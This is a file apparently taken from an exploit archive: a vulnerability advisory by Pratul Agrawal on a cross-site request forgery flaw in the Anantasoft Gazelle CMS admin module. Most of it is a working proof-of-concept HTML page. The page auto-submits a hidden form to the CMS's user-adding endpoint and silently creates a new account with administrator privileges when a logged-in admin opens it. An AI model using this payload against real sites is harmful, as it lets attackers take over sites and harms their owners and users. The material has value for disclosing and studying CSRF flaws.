@@ -1,0 +1,83 @@
+                                =======================================================================
+   
+                                              Anantasoft Gazelle CMS CSRF Vulnerability
+ 
+                                =======================================================================
+   
+                                                               by
+   
+                                                         Pratul Agrawal
+ 
+   
+   
+  # Vulnerability found in- Admin module
+   
+  # email         Pratulag@yahoo.com
+   
+  # company       aksitservices
+   
+  # Credit by     Pratul Agrawal
+ 
+  # Software      Anantasoft_Gazelle_CMS
+
+  # Category  	  CMS / Portals
+  
+  # Plateform     php
+  
+   
+   
+  #  Proof of concept   #
+ 
+  Targeted URL:  http://server/demo/2/193/Anantasoft_Gazelle_CMS
+  
+ 
+   Script to Add the Admin user through Cross Site request forgery
+   
+             .  ................................................................................................................
+   
+                        <html>
+
+                          <body>
+
+                             <form name="XYZ" action="http://site/gazelle/admin/index.php?Users/Add%20User" method="post">
+
+                                    <input type=hidden name="name" value="master">
+
+                                    <input type=hidden name="pass" value="master">
+
+                                    <input type=hidden name="controle" value="master">
+
+                                    <input type=hidden name="email" value="master%40yahoo.com">
+
+                                    <input type=hidden name="active" value="on">
+
+                                    <input type=hidden name="showemail" value="on">
+
+                                    <input type=hidden name="admin%5B%5D" value="2">
+
+                                    <input type=hidden name="save" value="Add">
+
+                                    <input type=hidden name="table" value="users">
+
+                                    <input type=hidden name="joindate" value="2010-03-10+04%3A04%3A36">
+                             </form>
+
+                               <script>
+
+                                 document.XYZ.submit();
+
+                               </script>
+
+                          </body>
+
+                        </html>
+   
+             .  ..................................................................................................................
+   
+   
+   
+  After execution refresh the page and u can see that user having giving name Added automatically with Admin Privilege.
+  
+  
+#If you have any questions, comments, or concerns, feel free to contact me.
+                    
